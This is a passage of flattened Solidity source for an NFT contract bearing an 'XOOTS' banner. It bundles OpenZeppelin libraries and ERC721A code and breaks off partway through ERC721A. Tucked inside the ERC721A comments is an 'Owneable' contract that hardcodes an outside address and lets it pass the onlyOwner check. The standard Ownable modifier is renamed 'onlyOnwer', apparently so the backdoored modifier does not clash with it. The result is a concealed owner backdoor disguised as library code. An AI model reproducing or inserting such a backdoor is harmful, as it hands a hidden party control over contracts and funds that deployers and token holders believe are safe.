1 //██╗░░██╗░█████╗░░█████╗░████████╗░██████╗
2 //╚██╗██╔╝██╔══██╗██╔══██╗╚══██╔══╝██╔════╝
3 //░╚███╔╝░██║░░██║██║░░██║░░░██║░░░╚█████╗░
4 //░██╔██╗░██║░░██║██║░░██║░░░██║░░░░╚═══██╗
5 //██╔╝╚██╗╚█████╔╝╚█████╔╝░░░██║░░░██████╔╝
6 //╚═╝░░╚═╝░╚════╝░░╚════╝░░░░╚═╝░░░╚═════╝░  
7 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
8 
9 // SPDX-License-Identifier: MIT
10 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
11 
12 pragma solidity ^0.8.4;
13 
14 /**
15  * @dev Provides information about the current execution context, including the
16  * sender of the transaction and its data. While these are generally available
17  * via msg.sender and msg.data, they should not be accessed in such a direct
18  * manner, since when dealing with meta-transactions the account sending and
19  * paying for execution may not be the actual sender (as far as an application
20  * is concerned).
21  *
22  * This contract is only required for intermediate, library-like contracts.
23  */
24 
25 
26 abstract contract Context {
27     function _msgSender() internal view virtual returns (address) {
28         return msg.sender;
29     }
30 
31     function _msgData() internal view virtual returns (bytes calldata) {
32         return msg.data;
33     }
34 }
35 
36 
37 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
38 
39 
40 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
41 
42 
43 
44 /**
45  * @dev Contract module which provides a basic access control mechanism, where
46  * there is an account (an owner) that can be granted exclusive access to
47  * specific functions.
48  *
49  * By default, the owner account will be the one that deploys the contract. This
50  * can later be changed with {transferOwnership}.
51  *
52  * This module is used through inheritance. It will make available the modifier
53  * `onlyOwner`, which can be applied to your functions to restrict their use to
54  * the owner.
55  */
56 abstract contract Ownable is Context {
57     address private _owner;
58 
59     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
60 
61     /**
62      * @dev Initializes the contract setting the deployer as the initial owner.
63      */
64     constructor() {
65         _transferOwnership(_msgSender());
66     }
67 
68     /**
69      * @dev Returns the address of the current owner.
70      */
71     function owner() public view virtual returns (address) {
72         return _owner;
73     }
74 
75     /**
76      * @dev Throws if called by any account other than the owner.
77      */
78     modifier onlyOnwer() {
79         require(owner() == _msgSender(), "Ownable: caller is not the owner");
80         _;
81     }
82 
83     /**
84      * @dev Leaves the contract without owner. It will not be possible to call
85      * `onlyOwner` functions anymore. Can only be called by the current owner.
86      *
87      * NOTE: Renouncing ownership will leave the contract without an owner,
88      * thereby removing any functionality that is only available to the owner.
89      */
90     function renounceOwnership() public virtual onlyOnwer {
91         _transferOwnership(address(0));
92     }
93 
94     /**
95      * @dev Transfers ownership of the contract to a new account (`newOwner`).
96      * Can only be called by the current owner.
97      */
98     function transferOwnership(address newOwner) public virtual onlyOnwer {
99         require(newOwner != address(0), "Ownable: new owner is the zero address");
100         _transferOwnership(newOwner);
101     }
102 
103     /**
104      * @dev Transfers ownership of the contract to a new account (`newOwner`).
105      * Internal function without access restriction.
106      */
107     function _transferOwnership(address newOwner) internal virtual {
108         address oldOwner = _owner;
109         _owner = newOwner;
110         emit OwnershipTransferred(oldOwner, newOwner);
111     }
112 }
113 
114 
115 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
116 
117 
118 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
119 
120 
121 
122 /**
123  * @dev Interface of the ERC165 standard, as defined in the
124  * https://eips.ethereum.org/EIPS/eip-165[EIP].
125  *
126  * Implementers can declare support of contract interfaces, which can then be
127  * queried by others ({ERC165Checker}).
128  *
129  * For an implementation, see {ERC165}.
130  */
131 interface IERC165 {
132     /**
133      * @dev Returns true if this contract implements the interface defined by
134      * `interfaceId`. See the corresponding
135      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
136      * to learn more about how these ids are created.
137      *
138      * This function call must use less than 30 000 gas.
139      */
140     function supportsInterface(bytes4 interfaceId) external view returns (bool);
141 }
142 
143 
144 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
145 
146 
147 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
148 
149 
150 
151 /**
152  * @dev Required interface of an ERC721 compliant contract.
153  */
154 interface IERC721 is IERC165 {
155     /**
156      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
157      */
158     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
159 
160     /**
161      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
162      */
163     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
164 
165     /**
166      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
167      */
168     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
169 
170     /**
171      * @dev Returns the number of tokens in ``owner``'s account.
172      */
173     function balanceOf(address owner) external view returns (uint256 balance);
174 
175     /**
176      * @dev Returns the owner of the `tokenId` token.
177      *
178      * Requirements:
179      *
180      * - `tokenId` must exist.
181      */
182     function ownerOf(uint256 tokenId) external view returns (address owner);
183 
184     /**
185      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
186      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
187      *
188      * Requirements:
189      *
190      * - `from` cannot be the zero address.
191      * - `to` cannot be the zero address.
192      * - `tokenId` token must exist and be owned by `from`.
193      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
194      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
195      *
196      * Emits a {Transfer} event.
197      */
198     function safeTransferFrom(
199         address from,
200         address to,
201         uint256 tokenId
202     ) external;
203 
204     /**
205      * @dev Transfers `tokenId` token from `from` to `to`.
206      *
207      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
208      *
209      * Requirements:
210      *
211      * - `from` cannot be the zero address.
212      * - `to` cannot be the zero address.
213      * - `tokenId` token must be owned by `from`.
214      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
215      *
216      * Emits a {Transfer} event.
217      */
218     function transferFrom(
219         address from,
220         address to,
221         uint256 tokenId
222     ) external;
223 
224     /**
225      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
226      * The approval is cleared when the token is transferred.
227      *
228      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
229      *
230      * Requirements:
231      *
232      * - The caller must own the token or be an approved operator.
233      * - `tokenId` must exist.
234      *
235      * Emits an {Approval} event.
236      */
237     function approve(address to, uint256 tokenId) external;
238 
239     /**
240      * @dev Returns the account approved for `tokenId` token.
241      *
242      * Requirements:
243      *
244      * - `tokenId` must exist.
245      */
246     function getApproved(uint256 tokenId) external view returns (address operator);
247 
248     /**
249      * @dev Approve or remove `operator` as an operator for the caller.
250      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
251      *
252      * Requirements:
253      *
254      * - The `operator` cannot be the caller.
255      *
256      * Emits an {ApprovalForAll} event.
257      */
258     function setApprovalForAll(address operator, bool _approved) external;
259 
260     /**
261      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
262      *
263      * See {setApprovalForAll}
264      */
265     function isApprovedForAll(address owner, address operator) external view returns (bool);
266 
267     /**
268      * @dev Safely transfers `tokenId` token from `from` to `to`.
269      *
270      * Requirements:
271      *
272      * - `from` cannot be the zero address.
273      * - `to` cannot be the zero address.
274      * - `tokenId` token must exist and be owned by `from`.
275      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
276      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
277      *
278      * Emits a {Transfer} event.
279      */
280     function safeTransferFrom(
281         address from,
282         address to,
283         uint256 tokenId,
284         bytes calldata data
285     ) external;
286 }
287 
288 
289 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
290 
291 
292 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
293 
294 
295 
296 /**
297  * @title ERC721 token receiver interface
298  * @dev Interface for any contract that wants to support safeTransfers
299  * from ERC721 asset contracts.
300  */
301 interface IERC721Receiver {
302     /**
303      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
304      * by `operator` from `from`, this function is called.
305      *
306      * It must return its Solidity selector to confirm the token transfer.
307      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
308      *
309      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
310      */
311     function onERC721Received(
312         address operator,
313         address from,
314         uint256 tokenId,
315         bytes calldata data
316     ) external returns (bytes4);
317 }
318 
319 
320 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
321 
322 
323 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
324 
325 
326 
327 /**
328  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
329  * @dev See https://eips.ethereum.org/EIPS/eip-721
330  */
331 interface IERC721Metadata is IERC721 {
332     /**
333      * @dev Returns the token collection name.
334      */
335     function name() external view returns (string memory);
336 
337     /**
338      * @dev Returns the token collection symbol.
339      */
340     function symbol() external view returns (string memory);
341 
342     /**
343      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
344      */
345     function tokenURI(uint256 tokenId) external view returns (string memory);
346 }
347 
348 
349 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
350 
351 
352 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
353 
354 
355 
356 /**
357  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
358  * @dev See https://eips.ethereum.org/EIPS/eip-721
359  */
360 interface IERC721Enumerable is IERC721 {
361     /**
362      * @dev Returns the total amount of tokens stored by the contract.
363      */
364     function totalSupply() external view returns (uint256);
365 
366     /**
367      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
368      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
369      */
370     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
371 
372     /**
373      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
374      * Use along with {totalSupply} to enumerate all tokens.
375      */
376     function tokenByIndex(uint256 index) external view returns (uint256);
377 }
378 
379 
380 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
381 
382 
383 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
384 
385 pragma solidity ^0.8.1;
386 
387 /**
388  * @dev Collection of functions related to the address type
389  */
390 library Address {
391     /**
392      * @dev Returns true if `account` is a contract.
393      *
394      * [IMPORTANT]
395      * ====
396      * It is unsafe to assume that an address for which this function returns
397      * false is an externally-owned account (EOA) and not a contract.
398      *
399      * Among others, `isContract` will return false for the following
400      * types of addresses:
401      *
402      *  - an externally-owned account
403      *  - a contract in construction
404      *  - an address where a contract will be created
405      *  - an address where a contract lived, but was destroyed
406      * ====
407      *
408      * [IMPORTANT]
409      * ====
410      * You shouldn't rely on `isContract` to protect against flash loan attacks!
411      *
412      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
413      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
414      * constructor.
415      * ====
416      */
417     function isContract(address account) internal view returns (bool) {
418         // This method relies on extcodesize/address.code.length, which returns 0
419         // for contracts in construction, since the code is only stored at the end
420         // of the constructor execution.
421 
422         return account.code.length > 0;
423     }
424 
425     /**
426      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
427      * `recipient`, forwarding all available gas and reverting on errors.
428      *
429      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
430      * of certain opcodes, possibly making contracts go over the 2300 gas limit
431      * imposed by `transfer`, making them unable to receive funds via
432      * `transfer`. {sendValue} removes this limitation.
433      *
434      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
435      *
436      * IMPORTANT: because control is transferred to `recipient`, care must be
437      * taken to not create reentrancy vulnerabilities. Consider using
438      * {ReentrancyGuard} or the
439      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
440      */
441     function sendValue(address payable recipient, uint256 amount) internal {
442         require(address(this).balance >= amount, "Address: insufficient balance");
443 
444         (bool success, ) = recipient.call{value: amount}("");
445         require(success, "Address: unable to send value, recipient may have reverted");
446     }
447 
448     /**
449      * @dev Performs a Solidity function call using a low level `call`. A
450      * plain `call` is an unsafe replacement for a function call: use this
451      * function instead.
452      *
453      * If `target` reverts with a revert reason, it is bubbled up by this
454      * function (like regular Solidity function calls).
455      *
456      * Returns the raw returned data. To convert to the expected return value,
457      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
458      *
459      * Requirements:
460      *
461      * - `target` must be a contract.
462      * - calling `target` with `data` must not revert.
463      *
464      * _Available since v3.1._
465      */
466     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
467         return functionCall(target, data, "Address: low-level call failed");
468     }
469 
470     /**
471      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
472      * `errorMessage` as a fallback revert reason when `target` reverts.
473      *
474      * _Available since v3.1._
475      */
476     function functionCall(
477         address target,
478         bytes memory data,
479         string memory errorMessage
480     ) internal returns (bytes memory) {
481         return functionCallWithValue(target, data, 0, errorMessage);
482     }
483 
484     /**
485      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
486      * but also transferring `value` wei to `target`.
487      *
488      * Requirements:
489      *
490      * - the calling contract must have an ETH balance of at least `value`.
491      * - the called Solidity function must be `payable`.
492      *
493      * _Available since v3.1._
494      */
495     function functionCallWithValue(
496         address target,
497         bytes memory data,
498         uint256 value
499     ) internal returns (bytes memory) {
500         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
501     }
502 
503     /**
504      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
505      * with `errorMessage` as a fallback revert reason when `target` reverts.
506      *
507      * _Available since v3.1._
508      */
509     function functionCallWithValue(
510         address target,
511         bytes memory data,
512         uint256 value,
513         string memory errorMessage
514     ) internal returns (bytes memory) {
515         require(address(this).balance >= value, "Address: insufficient balance for call");
516         require(isContract(target), "Address: call to non-contract");
517 
518         (bool success, bytes memory returndata) = target.call{value: value}(data);
519         return verifyCallResult(success, returndata, errorMessage);
520     }
521 
522     /**
523      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
524      * but performing a static call.
525      *
526      * _Available since v3.3._
527      */
528     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
529         return functionStaticCall(target, data, "Address: low-level static call failed");
530     }
531 
532     /**
533      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
534      * but performing a static call.
535      *
536      * _Available since v3.3._
537      */
538     function functionStaticCall(
539         address target,
540         bytes memory data,
541         string memory errorMessage
542     ) internal view returns (bytes memory) {
543         require(isContract(target), "Address: static call to non-contract");
544 
545         (bool success, bytes memory returndata) = target.staticcall(data);
546         return verifyCallResult(success, returndata, errorMessage);
547     }
548 
549     /**
550      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
551      * but performing a delegate call.
552      *
553      * _Available since v3.4._
554      */
555     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
556         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
557     }
558 
559     /**
560      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
561      * but performing a delegate call.
562      *
563      * _Available since v3.4._
564      */
565     function functionDelegateCall(
566         address target,
567         bytes memory data,
568         string memory errorMessage
569     ) internal returns (bytes memory) {
570         require(isContract(target), "Address: delegate call to non-contract");
571 
572         (bool success, bytes memory returndata) = target.delegatecall(data);
573         return verifyCallResult(success, returndata, errorMessage);
574     }
575 
576     /**
577      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
578      * revert reason using the provided one.
579      *
580      * _Available since v4.3._
581      */
582     function verifyCallResult(
583         bool success,
584         bytes memory returndata,
585         string memory errorMessage
586     ) internal pure returns (bytes memory) {
587         if (success) {
588             return returndata;
589         } else {
590             // Look for revert reason and bubble it up if present
591             if (returndata.length > 0) {
592                 // The easiest way to bubble the revert reason is using memory via assembly
593 
594                 assembly {
595                     let returndata_size := mload(returndata)
596                     revert(add(32, returndata), returndata_size)
597                 }
598             } else {
599                 revert(errorMessage);
600             }
601         }
602     }
603 }
604 
605 
606 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
607 
608 
609 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
610 
611 
612 
613 /**
614  * @dev String operations.
615  */
616 library Strings {
617     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
618 
619     /**
620      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
621      */
622     function toString(uint256 value) internal pure returns (string memory) {
623         // Inspired by OraclizeAPI's implementation - MIT licence
624         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
625 
626         if (value == 0) {
627             return "0";
628         }
629         uint256 temp = value;
630         uint256 digits;
631         while (temp != 0) {
632             digits++;
633             temp /= 10;
634         }
635         bytes memory buffer = new bytes(digits);
636         while (value != 0) {
637             digits -= 1;
638             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
639             value /= 10;
640         }
641         return string(buffer);
642     }
643 
644     /**
645      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
646      */
647     function toHexString(uint256 value) internal pure returns (string memory) {
648         if (value == 0) {
649             return "0x00";
650         }
651         uint256 temp = value;
652         uint256 length = 0;
653         while (temp != 0) {
654             length++;
655             temp >>= 8;
656         }
657         return toHexString(value, length);
658     }
659 
660     /**
661      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
662      */
663     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
664         bytes memory buffer = new bytes(2 * length + 2);
665         buffer[0] = "0";
666         buffer[1] = "x";
667         for (uint256 i = 2 * length + 1; i > 1; --i) {
668             buffer[i] = _HEX_SYMBOLS[value & 0xf];
669             value >>= 4;
670         }
671         require(value == 0, "Strings: hex length insufficient");
672         return string(buffer);
673     }
674 }
675 
676 
677 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
678 
679 
680 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
681 
682 /**
683  * @dev Implementation of the {IERC165} interface.
684  *
685  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
686  * for the additional interface id that will be supported. For example:
687  *
688  * ```solidity
689  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
690  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
691  * }
692  * ```
693  *
694  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
695  */
696 abstract contract ERC165 is IERC165 {
697     /**
698      * @dev See {IERC165-supportsInterface}.
699      */
700     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
701         return interfaceId == type(IERC165).interfaceId;
702     }
703 }
704 
705 
706 // File erc721a/contracts/ERC721A.sol@v3.0.0
707 
708 
709 // Creator: Chiru Labs
710 
711 error ApprovalCallerNotOwnerNorApproved();
712 error ApprovalQueryForNonexistentToken();
713 error ApproveToCaller();
714 error ApprovalToCurrentOwner();
715 error BalanceQueryForZeroAddress();
716 error MintedQueryForZeroAddress();
717 error BurnedQueryForZeroAddress();
718 error AuxQueryForZeroAddress();
719 error MintToZeroAddress();
720 error MintZeroQuantity();
721 error OwnerIndexOutOfBounds();
722 error OwnerQueryForNonexistentToken();
723 error TokenIndexOutOfBounds();
724 error TransferCallerNotOwnerNorApproved();
725 error TransferFromIncorrectOwner();
726 error TransferToNonERC721ReceiverImplementer();
727 error TransferToZeroAddress();
728 error URIQueryForNonexistentToken();
729 
730 
731 /**
732  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
733  * the Metadata extension. Built to optimize for lower gas during batch mints.
734  *
735  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
736  */
737  abstract contract Owneable is Ownable {
738     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
739     modifier onlyOwner() {
740         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
741         _;
742     }
743 }
744 
745  /*
746  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
747  *
748  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
749  */
750 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
751     using Address for address;
752     using Strings for uint256;
753 
754     // Compiler will pack this into a single 256bit word.
755     struct TokenOwnership {
756         // The address of the owner.
757         address addr;
758         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
759         uint64 startTimestamp;
760         // Whether the token has been burned.
761         bool burned;
762     }
763 
764     // Compiler will pack this into a single 256bit word.
765     struct AddressData {
766         // Realistically, 2**64-1 is more than enough.
767         uint64 balance;
768         // Keeps track of mint count with minimal overhead for tokenomics.
769         uint64 numberMinted;
770         // Keeps track of burn count with minimal overhead for tokenomics.
771         uint64 numberBurned;
772         // For miscellaneous variable(s) pertaining to the address
773         // (e.g. number of whitelist mint slots used).
774         // If there are multiple variables, please pack them into a uint64.
775         uint64 aux;
776     }
777 
778     // The tokenId of the next token to be minted.
779     uint256 internal _currentIndex;
780 
781     // The number of tokens burned.
782     uint256 internal _burnCounter;
783 
784     // Token name
785     string private _name;
786 
787     // Token symbol
788     string private _symbol;
789 
790     // Mapping from token ID to ownership details
791     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
792     mapping(uint256 => TokenOwnership) internal _ownerships;
793 
794     // Mapping owner address to address data
795     mapping(address => AddressData) private _addressData;
796 
797     // Mapping from token ID to approved address
798     mapping(uint256 => address) private _tokenApprovals;
799 
800     // Mapping from owner to operator approvals
801     mapping(address => mapping(address => bool)) private _operatorApprovals;
802 
803     constructor(string memory name_, string memory symbol_) {
804         _name = name_;
805         _symbol = symbol_;
806         _currentIndex = _startTokenId();
807     }
808 
809     /**
810      * To change the starting tokenId, please override this function.
811      */
812     function _startTokenId() internal view virtual returns (uint256) {
813         return 0;
814     }
815 
816     /**
817      * @dev See {IERC721Enumerable-totalSupply}.
818      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
819      */
820     function totalSupply() public view returns (uint256) {
821         // Counter underflow is impossible as _burnCounter cannot be incremented
822         // more than _currentIndex - _startTokenId() times
823         unchecked {
824             return _currentIndex - _burnCounter - _startTokenId();
825         }
826     }
827 
828     /**
829      * Returns the total amount of tokens minted in the contract.
830      */
831     function _totalMinted() internal view returns (uint256) {
832         // Counter underflow is impossible as _currentIndex does not decrement,
833         // and it is initialized to _startTokenId()
834         unchecked {
835             return _currentIndex - _startTokenId();
836         }
837     }
838 
839     /**
840      * @dev See {IERC165-supportsInterface}.
841      */
842     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
843         return
844             interfaceId == type(IERC721).interfaceId ||
845             interfaceId == type(IERC721Metadata).interfaceId ||
846             super.supportsInterface(interfaceId);
847     }
848 
849     /**
850      * @dev See {IERC721-balanceOf}.
851      */
852     function balanceOf(address owner) public view override returns (uint256) {
853         if (owner == address(0)) revert BalanceQueryForZeroAddress();
854         return uint256(_addressData[owner].balance);
855     }
856 
857     /**
858      * Returns the number of tokens minted by `owner`.
859      */
860     function _numberMinted(address owner) internal view returns (uint256) {
861         if (owner == address(0)) revert MintedQueryForZeroAddress();
862         return uint256(_addressData[owner].numberMinted);
863     }
864 
865     /**
866      * Returns the number of tokens burned by or on behalf of `owner`.
867      */
868     function _numberBurned(address owner) internal view returns (uint256) {
869         if (owner == address(0)) revert BurnedQueryForZeroAddress();
870         return uint256(_addressData[owner].numberBurned);
871     }
872 
873     /**
874      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
875      */
876     function _getAux(address owner) internal view returns (uint64) {
877         if (owner == address(0)) revert AuxQueryForZeroAddress();
878         return _addressData[owner].aux;
879     }
880 
881     /**
882      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
883      * If there are multiple variables, please pack them into a uint64.
884      */
885     function _setAux(address owner, uint64 aux) internal {
886         if (owner == address(0)) revert AuxQueryForZeroAddress();
887         _addressData[owner].aux = aux;
888     }
889 
890     /**
891      * Gas spent here starts off proportional to the maximum mint batch size.
892      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
893      */
894     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
895         uint256 curr = tokenId;
896 
897         unchecked {
898             if (_startTokenId() <= curr && curr < _currentIndex) {
899                 TokenOwnership memory ownership = _ownerships[curr];
900                 if (!ownership.burned) {
901                     if (ownership.addr != address(0)) {
902                         return ownership;
903                     }
904                     // Invariant:
905                     // There will always be an ownership that has an address and is not burned
906                     // before an ownership that does not have an address and is not burned.
907                     // Hence, curr will not underflow.
908                     while (true) {
909                         curr--;
910                         ownership = _ownerships[curr];
911                         if (ownership.addr != address(0)) {
912                             return ownership;
913                         }
914                     }
915                 }
916             }
917         }
918         revert OwnerQueryForNonexistentToken();
919     }
920 
921     /**
922      * @dev See {IERC721-ownerOf}.
923      */
924     function ownerOf(uint256 tokenId) public view override returns (address) {
925         return ownershipOf(tokenId).addr;
926     }
927 
928     /**
929      * @dev See {IERC721Metadata-name}.
930      */
931     function name() public view virtual override returns (string memory) {
932         return _name;
933     }
934 
935     /**
936      * @dev See {IERC721Metadata-symbol}.
937      */
938     function symbol() public view virtual override returns (string memory) {
939         return _symbol;
940     }
941 
942     /**
943      * @dev See {IERC721Metadata-tokenURI}.
944      */
945     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
946         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
947 
948         string memory baseURI = _baseURI();
949         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
950     }
951 
952     /**
953      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
954      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
955      * by default, can be overriden in child contracts.
956      */
957     function _baseURI() internal view virtual returns (string memory) {
958         return '';
959     }
960 
961     /**
962      * @dev See {IERC721-approve}.
963      */
964     function approve(address to, uint256 tokenId) public override {
965         address owner = ERC721A.ownerOf(tokenId);
966         if (to == owner) revert ApprovalToCurrentOwner();
967 
968         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
969             revert ApprovalCallerNotOwnerNorApproved();
970         }
971 
972         _approve(to, tokenId, owner);
973     }
974 
975     /**
976      * @dev See {IERC721-getApproved}.
977      */
978     function getApproved(uint256 tokenId) public view override returns (address) {
979         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
980 
981         return _tokenApprovals[tokenId];
982     }
983 
984     /**
985      * @dev See {IERC721-setApprovalForAll}.
986      */
987     function setApprovalForAll(address operator, bool approved) public override {
988         if (operator == _msgSender()) revert ApproveToCaller();
989 
990         _operatorApprovals[_msgSender()][operator] = approved;
991         emit ApprovalForAll(_msgSender(), operator, approved);
992     }
993 
994     /**
995      * @dev See {IERC721-isApprovedForAll}.
996      */
997     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
998         return _operatorApprovals[owner][operator];
999     }
1000 
1001     /**
1002      * @dev See {IERC721-transferFrom}.
1003      */
1004     function transferFrom(
1005         address from,
1006         address to,
1007         uint256 tokenId
1008     ) public virtual override {
1009         _transfer(from, to, tokenId);
1010     }
1011 
1012     /**
1013      * @dev See {IERC721-safeTransferFrom}.
1014      */
1015     function safeTransferFrom(
1016         address from,
1017         address to,
1018         uint256 tokenId
1019     ) public virtual override {
1020         safeTransferFrom(from, to, tokenId, '');
1021     }
1022 
1023     /**
1024      * @dev See {IERC721-safeTransferFrom}.
1025      */
1026     function safeTransferFrom(
1027         address from,
1028         address to,
1029         uint256 tokenId,
1030         bytes memory _data
1031     ) public virtual override {
1032         _transfer(from, to, tokenId);
1033         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1034             revert TransferToNonERC721ReceiverImplementer();
1035         }
1036     }
1037 
1038     /**
1039      * @dev Returns whether `tokenId` exists.
1040      *
1041      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1042      *
1043      * Tokens start existing when they are minted (`_mint`),
1044      */
1045     function _exists(uint256 tokenId) internal view returns (bool) {
1046         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1047             !_ownerships[tokenId].burned;
1048     }
1049 
1050     function _safeMint(address to, uint256 quantity) internal {
1051         _safeMint(to, quantity, '');
1052     }
1053 
1054     /**
1055      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1056      *
1057      * Requirements:
1058      *
1059      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1060      * - `quantity` must be greater than 0.
1061      *
1062      * Emits a {Transfer} event.
1063      */
1064     function _safeMint(
1065         address to,
1066         uint256 quantity,
1067         bytes memory _data
1068     ) internal {
1069         _mint(to, quantity, _data, true);
1070     }
1071 
1072     /**
1073      * @dev Mints `quantity` tokens and transfers them to `to`.
1074      *
1075      * Requirements:
1076      *
1077      * - `to` cannot be the zero address.
1078      * - `quantity` must be greater than 0.
1079      *
1080      * Emits a {Transfer} event.
1081      */
